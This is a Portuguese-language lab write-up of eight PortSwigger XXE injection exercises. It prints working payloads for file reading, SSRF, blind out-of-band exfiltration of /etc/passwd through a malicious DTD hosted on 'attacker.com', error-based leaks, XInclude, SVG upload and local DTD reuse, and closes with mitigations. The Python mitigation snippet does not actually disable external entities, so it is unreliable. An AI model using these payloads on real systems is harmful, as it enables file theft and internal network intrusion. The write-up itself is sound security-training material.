# 💉 XXE Injection – PortSwigger Web Security Academy

## 📋 Informações Gerais

| Item | Detalhe |
|------|----------|
| **Plataforma** | PortSwigger Web Security Academy |
| **Categoria** | Injeção de Código |
| **Nível de Dificuldade** | Practitioner → Expert |
| **Status** | ✅ 8/8 Laboratórios Concluídos |
| **Data** | Junho 2026 |
| **Ferramentas** | Burp Suite, Interactsh |

---

## 🎯 Objetivo do Laboratório

Dominar XML External Entity (XXE) Injection em todas as suas variantes: leitura de arquivos, SSRF, blind XXE, extração via DTD e reutilização de DTD local.

---

## 📖 Resumo Executivo

XXE ocorre quando um parser XML processa entidades externas sem restrições. Permite:
1. **Leitura de arquivos** — `/etc/passwd`
2. **SSRF** — acesso a serviços internos
3. **Blind XXE** — exfiltração via DNS/HTTP
4. **RCE avançada** — em alguns SGBDs (Oracle)

Todos os 8 labs foram explorados com técnicas progressivas.

---

## 📚 Conceitos Teóricos

### O que é XXE?

XML suporta entidades externas:
```xml
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>  <!-- Substitui pela entidade -->
</stockCheck>
```

Se a aplicação não bloqueia entidades externas, isso funciona!

### Por que acontece?

- Parser XML com processamento de entidades ativado
- Falta de validação de DTD
- Desconhecimento de riscos XXE
- Configuração padrão insegura

---

## 🧪 Técnicas Exploradas

### 1. Basic XXE - File Read

```xml
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

**Resultado**: Conteúdo de `/etc/passwd` retornado na resposta.

---

### 2. XXE - SSRF

```xml
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
]>
```

**Resultado**: Acesso a serviço interno.

---

### 3. Blind XXE - Out-of-Band

```xml
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "https://attacker.com/callback">
]>
```

**Resultado**: DNS lookup ou HTTP request para `attacker.com`.

---

### 4. Blind XXE - Exfiltration via DTD

Hostedar em `attacker.com/dtd.xml`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%dtd;
%exfil;
```

Injetar:
```xml
<!DOCTYPE stockCheck [
  <!ENTITY % dtd SYSTEM "http://attacker.com/dtd.xml">
  %dtd;
]>
```

---

### 5. XXE - Error-Based Exfiltration

```xml
<!DOCTYPE stockCheck [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
  %dtd;
  %error;
]>
```

**Resultado**: Erro contém dados do arquivo.

---

### 6. XInclude Attack

Quando você não controla o documento XML completo, injetar em um parâmetro:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

### 7. XXE via SVG Upload

SVG é XML. Fazer upload:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg>
  <text>&xxe;</text>
</svg>
```

**Resultado**: Ao processar imagem, conteúdo é visível.

---

### 8. XXE - Local DTD Reuse (Expert)

Não carregar DTD externo, reutilizar local:
```xml
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'>
%local_dtd;
```

**Resultado**: Evita requisições detectáveis.

---

## 💥 Impacto Técnico

| Aspecto | Risco | Justificativa |
|---------|-------|---------------|
| **Confidencialidade** | 🔴 Alto | Leitura de arquivos |
| **Integridade** | 🟡 Médio | SSRF para acesso interno |
| **Disponibilidade** | 🔴 Alto | Billion Laughs / DoS |
| **Privilégios Necessários** | Verde | Nenhum |
| **Tipo de Ataque** | Ativo | XML parsing |

---

## 🛡️ Mitigação & Defesa

### ✅ Desativar Entidades Externas

```python
# Python
import xml.etree.ElementTree as ET
parser = ET.XMLParser()
parser.entity["xxe"] = None  # Desabilitar entidades

# Java
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);

# C# / .NET
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
```

### Princípios

- [x] Desabilitar processamento de entidades externas
- [x] Usar JSON em vez de XML quando possível
- [x] Whitelist de DTDs permitidas
- [x] Validação de schema
- [x] WAF/IDS

---

## 🎓 Lições Aprendidas

### Insight 1: Múltiplas Superfícies de Ataque
XML apresenta muitas variações: DTD, XInclude, SVG, etc.

### Insight 2: Blind Não Significa Impossível
Mesmo sem retorno visível, DNS/HTTP permite exfiltração.

### Insight 3: Encadeamento com Outras Vulnerabilidades
XXE + SSRF + SQL Injection = ataque muito poderoso.

---

## 🔗 Referências

- **OWASP**: [XML External Entity (XXE)](https://owasp.org/www-community/attacks/XML_External_Entity_%28XXE%29_Processing)
- **PortSwigger**: [XXE Injection](https://portswigger.net/web-security/xxe)
- **CWE**: [CWE-611 - Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)

---

**Autor**: Aislan Silva  
**Data de Conclusão**: Junho 2026  
**Status**: ✅ Documentado  
**Qualidade**: ⭐⭐⭐⭐⭐
